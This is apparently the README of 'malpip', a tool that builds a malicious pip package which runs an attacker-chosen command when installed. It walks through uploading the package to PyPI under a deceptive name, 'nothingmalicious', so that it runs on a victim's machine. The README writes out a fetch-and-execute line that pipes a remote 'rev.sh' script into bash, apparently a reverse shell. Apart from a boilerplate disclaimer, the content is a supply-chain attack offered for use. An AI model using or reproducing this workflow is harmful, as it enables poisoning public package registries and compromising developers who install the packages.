
# malpip
Tool that creates a malicious pip package that runs your command during installation.

## Prerequisite
Create an account on https://pypi.org

## Installation
1. Clone repository and set permissions.
```bash
git clone https://github.com/thegoodhackertv/malpip.git
cd malpip
sudo chmod +x malpip.sh
```
2. Install dependencies.
```bash
sudo ./malpip install
```
3. Set the command to be executed.
```bash
echo "curl -s http://localhost/rev.sh | bash" > command.txt
```
4. Create malicious project.
You will be asked for your pypi credentials to upload the project.
```bash
./malpip create nothingmalicious command.txt
```
5. Install the package on the victim machine and your command will be executed.
```bash
pip install nothingmalicious
```

## Useful Resources
- [Youtube video](https://youtu.be/ux32ZHUJbKk) (spanish)
- [Website post](https://thegoodhackertv.com/ciberseguridad/te-pueden-infectar-con-github-y-python/) (spanish)

## Disclaimer
Usage of these scripts for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## Support
[<img width=300 alt="patreon" src="https://pbs.twimg.com/media/DC4gjLRUMAAyQ92?format=jpg">](https://www.patreon.com/thegoodhacker)
[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-orange.png">](https://www.buymeacoffee.com/thegoodhacker)
